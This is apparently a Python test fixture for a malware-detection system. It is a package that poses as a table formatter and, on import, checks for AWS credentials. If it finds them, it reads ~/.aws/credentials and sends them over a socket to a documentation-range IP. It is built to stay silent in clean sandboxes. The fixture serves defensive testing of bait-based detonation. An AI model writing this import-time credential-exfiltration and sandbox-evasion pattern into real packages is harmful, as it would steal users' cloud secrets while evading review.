"""TEST FIXTURE -- NOT REAL MALWARE.

This is the demo star. It looks benign and STAYS SILENT on a clean run. It only
fires its (fake) credential-theft behaviour when it detects planted cloud
credentials in the environment -- i.e. only in the AWS-baited fork. That is
exactly the sandbox-evading behaviour a single naive run misses and that
fork-and-bait differential detonation catches.

All secrets are fake canaries; the connection target is an unroutable
documentation IP (203.0.113.7, RFC 5737). Nothing real is read or sent.
"""
import os, socket

def format_table(rows=None):
    """Innocuous-looking public API, so the package seems legitimate."""
    return "\n".join(str(r) for r in (rows or []))

def _maybe_fire():
    # evasion: do nothing unless we appear to be on a 'real' machine with creds
    key = os.environ.get("AWS_ACCESS_KEY_ID")
    if not key:
        return                       # clean fork -> silent, looks safe
    loot = [key]
    try:
        with open(os.path.expanduser("~/.aws/credentials")) as f:
            loot.append(f.read())
    except OSError:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        s.connect(("203.0.113.7", 443))   # RFC5737 TEST-NET-3, unroutable
        s.sendall(("".join(loot)).encode()[:512])
        s.close()
    except OSError:
        pass

_maybe_fire()
